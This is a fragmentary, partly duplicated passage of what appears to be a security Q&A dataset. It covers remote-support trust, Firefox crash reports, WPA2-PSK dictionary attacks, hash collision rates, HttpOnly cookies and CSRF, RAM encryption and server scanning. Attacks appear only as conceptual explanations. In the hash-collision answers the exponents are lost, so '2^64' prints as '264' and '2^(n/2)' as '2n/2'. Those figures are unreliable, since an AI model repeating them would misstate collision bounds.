For example, you call Microsoft, Dell, HP etc. and they ask to connect to your computer. This is safe because you know who are you calling.\nYou have logged a ticket and received an expected callback. In this case, the agent will need to confirm the trust by providing you with the details only a legitimate party will know, like the ticket number, your name, case details etc.\nYou have prior trust with an agent, for example, it's your company's IT department or an outsourced contractor that has access already.\n\nThere was an opinion that you must initiate the support case. This is not true, strictly speaking, especially for option 3 where your computer is a managed one. I have, on multiple occasions, called customers based on alerts raised by our monitoring software. But in this case we already have a remote control agent installed on the computer and call them to advise of the issue and notify that we need to take control."

      "question": "Is there any risk of login information being compromised after submitting a Firefox crash report?\nTitle says it all. I have crash reports specifically disabled and yet the browser submitted one anyway. What's the risk of login information (in particular: saved login info, open sessions in online services) being compromised? Is there any way of getting Mozilla to delete a crash dump?\nSome advice for everyone else running Firefox: delete crashreporter.exe from the Firefox directory, that thing is dangerous. There is no legitimate reason to send any such information when the end-user has taken every step to say \"No\". I was never prompted to send any crash report, the browser just sent it automatically despite having opted to disable them in the Settings.",
      "answer": "It is very unlikely that you gave away compromising information. Your active logins, cookies, search history and the content of your visited websites are safe. Presumably, the most relevant sensitive information in your case is the last visited URL (which you had to explicitly agree to submit).\nAlso note that Firefox doesn't submit crash reports without your consent. In the Mozilla docs you can find details on how the Mozilla Crash Reporter works and how you can understand crash reports.\nWhat does a crash report contain?\nA Firefox crash report contains information relevant for debugging such as:\n\nBrowser version\nInstalled extensions\nOperating system version and  configuration\nStack trace of the crash (involved modules, functions, etc.)\n\nYou can optionally include the URL of where the crash has occurred and a contact email address.\nWhere can I view my previous crash reports?\nYou can view your crashes from inside Firefox at about:crashes or locally at ~/.mozilla/firefox/Crash Reports/. All submitted Firefox crash reports are published on crash-stats.\nWho else can view a crash report?\nEveryone is able to view a basic version of your report but only few users can see sensitive details.\n\nSome fields, such as \"URL\" and \"Email Address\", are privacy-sensitive and are only visible to users with minidump access.\n\n(Source)\nSo even if you submitted the URL - it's not public, developers will probably never read it given the total amount of crash reports, and nobody will know it was you."

This modified plugin is saved in the typical folder /opt/nessus/lib/nessus/plugins with all the other plugins as pesa.nasl. \nA test-run with nasl -t  pesa.nasl prints the expected \"hello world\".\nBut when I run nessus again, after re-starting the daemon, the plugin doesn't get detected. Not when I look into the findings list, and also it's nowhere in the policies part that shows the plugins. \nAny ideas what I need to do additionally, that nessus reads my self-written plugins?",
      "answer": "It seems that nessus-update-plugins doesn't only fetch the newest updates from the nessus servers, but also tells the daemon about the new files that are placed in the plugin folder. \nSo /opt/nessus/sbin/nessus-update-plugins does the job."

How can I ensure that the data in the files is safe before uploading the data to database, and prevent persistent XSS attacks?",
      "answer": "You can't, really.\nYou can reduce the chances of content-sniffing running HTML by serving files with a X-Content-Type-Options: nosniff header, and try to avoid them being treated as HTML pages by serving with Content-Disposition: attachment, but still you have older browsers to worry about, and browser plugins. (For example Java's broken SOP and Flash's crossdomain XML sniffing.)\nBest workaround if you have to accept user-uploaded files is to serve them from a separate domain, so that any XSS attack can't compromise the main site."

      "question": "Offline downloading: Can the website owner know that I\u2019ve saved the page as webarchive while I\u2019m not connected to the internet?\nI noticed I can save a webpage as .webarchive file from my iPhone Safari while I\u2019m offline. Basically what I did was to open the website, log in, go to the specific page, then when it\u2019s finished loading, I turned off my internet connection.\nThen while the internet is completely off I tried\n\nAirdrop the page as webarchive to another device,\nSave to Files as webarchive\n\nBoth of which worked. I made sure I can open those webarchive files offline as well.\nCan the website owner know/track I\u2019ve downloaded/saved their webpage as webarchive even if I did the \u201cdownload\u201c part without the internet connection? One of the concerns is that I am registered to their website and I have to log in to view the content (wondering if that somehow increases chance of exposure).",
      "answer": "When you make an HTTP request to a website, you already download the webpage and related files, that's how it works. So the files are already on your iPhone. So no, they can't know if you saved it as a .webarchive file."

The symmetric key is generated randomly and uniquely for each message and never stored anywhere in plain text.\nThe message that actually gets sent consists of the original text encrypted with the symmetric key, and then for each recipient, one version of the symmetric key encrypted with that recipient's public key (plus other data such as IV/nonce for the symmetric encryption, integrity checks, potentially digital signatures, potentially the sender's certificate in plain text, metadata about the ciphers and signatures used, and so on)."

I seen an application on android that can reveal the wifi password even with WPA2 and it was not a trick.\nI know that there is a vulnerability with WPS, even when using WPA2, but aside from that is WPA2-PSK really secure?",
    "context": "",
    "output": "A: There are two (main) modes in which to run WPA2. You can use enterprise mode or pre-shared key (PSK) mode. \nIf you run in enterprise mode you need to set up an authenticating RADIUS server, and configure certificates on the clients that will connect to the access point. Furthermore you need to configure the AP will all the relevant information. This level of effort is well beyond the abilities of a typical user. \nWPA2-PSK mode uses a pre-shared key that both the client and AP know. This is the password, and simply using a password is within the technical abilities of most users. The password is never actually exchanged when a client connects to an AP. Instead there a is a four way handshake that occurs. Through this process the client can prove to the AP that it knows the PSK. \nWPA2-PSK is not really insecure. Instead I would say it's vulnerable to a brute force attack. If an attacker can capture a 4 way handshake (a trivial task) they can run that handshake through a dictionary in order to derive the PSK. This is the key part. Just like with normal password hashes long, complex passwords are they key to making the brute force attack un feasible.\nAs a final note: WPA2-PSK networks are \"salted\" with the name of the AP. Rainbow tables exist with precomputed hashes for the most common AP names that exist (think \"hilton-hhonors\", \"starbucks\" etc). A way to get a unique salt (and thus defeat the rainbow table) is to have a unique AP name. \nEdit: If you're curious about what a \"good\" password length then is if you have to use PSK? According to IEEE 802.11i (the amendment that details WPA2) \n\nA pass-phrase typically has about 2.5 bits of security per character, so the pass-phrase mapping converts an\n  n octet password into a key with about 2.5n + 12 bits of security. Hence, it provides a relatively low level of\n  security, with keys generated from short passwords subject to dictionary attack. Use of the key hash is recommended\n  only where it is impractical to make use of a stronger form of user authentication.

If I only try random data and wait for collisions to appear, well, I will wait for quite some time: the first collision is expected after about 264 hashed messages (give me a thousand PC, and I should achieve a collision in about 20 years of full-time computation).\nFor currently unbroken cryptographic hash functions, there is no known internal weakness (that's what \"unbroken\" means), so trying random messages is the best known method to create collisions. Chances to get a collision this way are vanishingly small until you hash at least 2n/2 messages, for a hash function with a n-bit output. This means that with any proper hash function with an output of 256 bits or more, the collision rate is, in practical conditions, zero (you will not get any and that's the end of the story).\nWikipedia has some pointers on the subject.

      "question": "Collision rate for different hash algorithms\nIs there any collision rate measure for popular hashing algorithms (md5, crc32, sha-*)?\nIf that depends only from output size, it's quite trivial to measure, but I suppose that depends also of distribution and algorithm's internals (and it demands some kind of formal proof, i think).",
      "answer": "If I try to create collisions for MD5, I can make one every 14 seconds (on average) on my PC, using a single core (Core2, 2.4 GHz). This exploits the weaknesses in the internal structure of MD5. If I only try random data and wait for collisions to appear, well, I will wait for quite some time: the first collision is expected after about 264 hashed messages (give me a thousand PC, and I should achieve a collision in about 20 years of full-time computation).\nFor currently unbroken cryptographic hash functions, there is no known internal weakness (that's what \"unbroken\" means), so trying random messages is the best known method to create collisions. Chances to get a collision this way are vanishingly small until you hash at least 2n/2 messages, for a hash function with a n-bit output. This means that with any proper hash function with an output of 256 bits or more, the collision rate is, in practical conditions, zero (you will not get any and that's the end of the story).\nWikipedia has some pointers on the subject. See also chapter 9 of the Handbook of Applied Cryptography (page 369)."

Here is my question for you:\nWhat's the point in creating an HTTP-only cookie if you're also storing the cookie contents outside of the secure cookie?\nThe whole point of making a cookie HTTP-only is that it secures the cookie contents from theft.  In the event of an XSS attack, an attacker can make requests on behalf of the user, but they can't outright steal the credentials - limiting the scope and timescale of the attack (in particular, the attacker will likely lose access as soon as the user navigates to a different page).\nIf you also are sending your cookie contents down to the app to store in a separate way, then the HTTP-only flag on your cookie is now pointless because in the event of an XSS attack, the attacker can steal the user's access credentials in from wherever else you are storing it, since only HTTP-only cookies provide any protection against credential theft in an XSS attack.\nThere are many effective methods to stop CSRF attacks.  As a result, if you are considering a method that also weakens another layer of security, then the answer is, quite simply, you're doing it the wrong way.\nIs there a reason you aren't considering CSRF tokens or custom headers?  The former are the norm and are perfectly secure, so unless you have a compelling reason not to use them, then just do it that way.

      "question": "Double Submit Cookie: Can the attacker set the cookie as a separate header?\nI\u2019m using an HttpOnly cookie to store authentication token client-side. To mitigate some of the risks of CSRF attacks, I\u2019m employing the Double Submit Cookie pattern. The same token is saved client-side as a separate header with the same value, and both get sent for subsequent requests when the user is logged in. \nMy question: Obviously the attacker will send the HttpOnly cookie when performing a CSRF attack, but can they set a separate authorization header whose value is identical to the HttpOnly cookie, even though he can\u2019t read the cookie\u2019s value?\nNote: I\u2019m aware of the limitations and workarounds pertaining to DSC.",
      "answer": "I think you're asking the wrong question.  Here is my question for you:\nWhat's the point in creating an HTTP-only cookie if you're also storing the cookie contents outside of the secure cookie?\nThe whole point of making a cookie HTTP-only is that it secures the cookie contents from theft.  In the event of an XSS attack, an attacker can make requests on behalf of the user, but they can't outright steal the credentials - limiting the scope and timescale of the attack (in particular, the attacker will likely lose access as soon as the user navigates to a different page).\nIf you also are sending your cookie contents down to the app to store in a separate way, then the HTTP-only flag on your cookie is now pointless because in the event of an XSS attack, the attacker can steal the user's access credentials in from wherever else you are storing it, since only HTTP-only cookies provide any protection against credential theft in an XSS attack.\nThere are many effective methods to stop CSRF attacks.  As a result, if you are considering a method that also weakens another layer of security, then the answer is, quite simply, you're doing it the wrong way.\nIs there a reason you aren't considering CSRF tokens or custom headers?  The former are the norm and are perfectly secure, so unless you have a compelling reason not to use them, then just do it that way.  If for some reason that isn't possible for you then you can fall back on custom headers, although that isn't ideal."

    "context": "",
    "output": "Answer: Without adding any additional hardware, is RAM encryption possible?\n\nSure.\nYou can encrypt whatever you like in RAM, just like you encrypt everything else.\nThe more interesting quesstion is \"where are the keys\". You can just leave the keys in RAM as well or give them to the OS which will also store them in RAM.\nYou can apply some of the fancy techniques proposed by Schneier et. al. in Cryptography Engineering, i.e. one-time-pad encrypt the key to your data, store the pad in RAM and decrypt data only when needed.\n\nIf so are there any known and currently used implementations for Linux or Windows systems\n\nWindows offers the Data-Protection API (DPAPI), letting you encrypt data using the user's log-in credentials. I know that at least some password managers (like KeePass) use this to protect the valuable passwords in RAM.\nUsing a Trusted Platform Module (TPM; which get increasingly popular as Windows now requires them) or some other dedicated hardware would indeed solve the issue best by offloading the key to a place you trust in case the RAM is compromised.\nHowever there's one solution that is rolling out right now: Intel's Software Guard Extensions (SGX), shipping with Skylake and newer CPUs. They allow you to load a program into your processor, verify its state is correct - remotely - and then protect its execution. The CPU will automatically encrypt everything leaving the processor (i.e. everything that is offloaded to RAM) and will thereby ensure security for you. The only problem for mass deployment is that SGX requires you to have a signed code that your processor will accept, i.e. Intel must issue you a certificate for this purpose.",

      "answer": "Without adding any additional hardware, is RAM encryption possible?\n\nSure.\nYou can encrypt whatever you like in RAM, just like you encrypt everything else.\nThe more interesting quesstion is \"where are the keys\". You can just leave the keys in RAM as well or give them to the OS which will also store them in RAM.\nYou can apply some of the fancy techniques proposed by Schneier et. al. in Cryptography Engineering, i.e. one-time-pad encrypt the key to your data, store the pad in RAM and decrypt data only when needed.\n\nIf so are there any known and currently used implementations for Linux or Windows systems\n\nWindows offers the Data-Protection API (DPAPI), letting you encrypt data using the user's log-in credentials. I know that at least some password managers (like KeePass) use this to protect the valuable passwords in RAM.\nUsing a Trusted Platform Module (TPM; which get increasingly popular as Windows now requires them) or some other dedicated hardware would indeed solve the issue best by offloading the key to a place you trust in case the RAM is compromised.\nHowever there's one solution that is rolling out right now: Intel's Software Guard Extensions (SGX), shipping with Skylake and newer CPUs. They allow you to load a program into your processor, verify its state is correct - remotely - and then protect its execution. The CPU will automatically encrypt everything leaving the processor (i.e. everything that is offloaded to RAM) and will thereby ensure security for you. The only problem for mass deployment is that SGX requires you to have a signed code that your processor will accept, i.e. Intel must issue you a certificate for this purpose."

When you visit it, it shows a description of what tabnabbing is. When you then click another tab, it changes the tabs favicon and title to look like Gmail. Later, when the user wants to read her mail she goes to this tab thinking it is Gmail and enters her credentials.\nEdit:\nIn this animation, you see that while I am reading SE, the tab that at first looked harmless changes in the background to look like Gmail.

      "question": "Why is the read write speed of a Protected DVD so slow?\nI got a DVD with copy protection enabled on it, but the problem I am facing is that it loads extremely slow. I have seen such happenings with other kinds of protected DVD's as well.\nCan anyone tell me why they are slow in loading as compared to the other DVD's. I know that such kind of DVD's utilize Content Scrambling Systems (CSS) for protection but why is the loading speed compromised?",
      "answer": "As with any encryption technique, decrypting will take longer than reading an unencyrpted or less sophisticatedly protected file. There is no exception with dvds. One way to really see the difference is to rip a dvd from two different computers with different processor speeds. You will notice that the computer with the higher speed will rip the dvd faster."

      "answer": "Memory in almost all modern OSes is virtualized, which means each process has its own address space. This means that the same addresses holds a different value in your python program than it holds in your debugee.\nSo, the only way to patch that memory is WriteProcessMemory, there's no way to access the memory of your debugee with any kind of pointer.\nIf you inject a DLL into the debugged process, that DLL could access the memory of that process directly, however, this still leaves you with the problem of how to communicate with the DLL, since you can't just call any functions in it if it's not in your process space. Combined with all other problems this may cause, i'd strongly recommend against that."

I also checked my server access logs and noticed some malicious attempts on URLs from the same IPs, trying to bruteforce SSH. One example of a request they made is myip/otherip/file.php. I'm not sure how to interpret this. I traced back the IP of that server and it's on the same hosting company I'm on.\nQuestion: How did they find out about the IP of the server before I even served the app from it or gave it out?\nMy guess: I'm guessing it is some bot that keeps trying on different IPs of some pattern that leads to servers of the same hosting company.

    "context": "",
    "output": "All servers using IPv4 addresses get some level of background noise in the form of automated scanning and bruteforce attempts. This is basically because it is easy to scan the entire address space - it takes less than an hour, and can result in systems which haven't been fully patched or set up yet.\nAs a result, I would fully expect any system to see lots of this kind of traffic. This is why it is important to sort out your security before opening your server to the internet. Keep your firewall turned on, blocking any incoming traffic whilst setting it up. Restrict access to know IP addresses for testing. Once you are sure it's secure, then you can open the firewall to the rest of the internet to connect.\nIf you have a server with a reverse DNS lookup set, once someone has the IP address, they can look to see what domain name your system thinks it belongs to, hence the URL attempts too.\nBasically, if you have made sure your system is secure, don't worry - make sure you've got decent passwords for SSH (or, better yet, key-based login), and that any other services are locked down properly. If you haven't, or you think they got in, treat it like a compromised server - sort out your firewall (probably with your hosting provider) and then start over.",

      "question": "How do attackers find the IP addresses of recently deployed servers?\nAbout two months ago, I deployed an Ubuntu server with as main purpose serving a web app. However, I'm still developing the app and only gave the server IP to my coworker and some friends for testing.  \nYesterday I checked the fail2ban logs and noticed many SSH bruteforce attempts from China, France etc. that dated to before I gave out the IP. I also checked my server access logs and noticed some malicious attempts on URLs from the same IPs, trying to bruteforce SSH. One example of a request they made is myip/otherip/file.php. I'm not sure how to interpret this. I traced back the IP of that server and it's on the same hosting company I'm on.\nQuestion: How did they find out about the IP of the server before I even served the app from it or gave it out?\nMy guess: I'm guessing it is some bot that keeps trying on different IPs of some pattern that leads to servers of the same hosting company. Is that a correct assumption, or are there other possibilities?",
      "answer": "All servers using IPv4 addresses get some level of background noise in the form of automated scanning and bruteforce attempts. This is basically because it is easy to scan the entire address space - it takes less than an hour, and can result in systems which haven't been fully patched or set up yet.\nAs a result, I would fully expect any system to see lots of this kind of traffic. This is why it is important to sort out your security before opening your server to the internet. Keep your firewall turned on, blocking any incoming traffic whilst setting it up. Restrict access to know IP addresses for testing. Once you are sure it's secure, then you can open the firewall to the rest of the internet to connect.\nIf you have a server with a reverse DNS lookup set, once someone has the IP address, they can look to see what domain name your system thinks it belongs to, hence the URL attempts too.\nBasically, if you have made sure your system is secure, don't worry - make sure you've got decent passwords for SSH (or, better yet, key-based login), and that any other services are locked down properly. If you haven't, or you think they got in, treat it like a compromised server - sort out your firewall (probably with your hosting provider) and then start over."

      "answer": "I think that confirming the old password doesn't help you secure your account in the case you lost your password. But It does make sense when no one has stolen your password, because it makes sure that you are the only one who can change your password (because only you know your password). For example, no one knows your Facebook password, but you've already logged in Facebook with your account on your cell phone, and then your friend borrows your phone. If he/she wants to change your password, it's impossible without knowing your current password."

Now you're immune to a hack in the OS's crypto layer, but if the attacker is targeting your app specifically then there's nothing to stop them, so you're not preventing an attack like this, just making it more difficult.\n\nAnother trick I've heard of is for the app to try to detect if it's running on a rooted device, and refuse to run if it is. That said, if you google \"bypass jailbreak detection\" you'll see that there is a constant game of whack-a-mole going on between hackers and developers where the hackers are getting increasingly clever at hiding the jailbreak. I don't recommend playing this game."

Sometimes I have to use a Windows network on which I have an account, but of course I have to type my username first. Still, going right into my password is a natural habit.\nIn a careless moment recently, I woke a machine on that Windows network and, by habit, typed my password and hit enter. It actually put it into the username field.\nI've changed my password since then, but was the old password compromised? How does Windows (7) handle such a login?
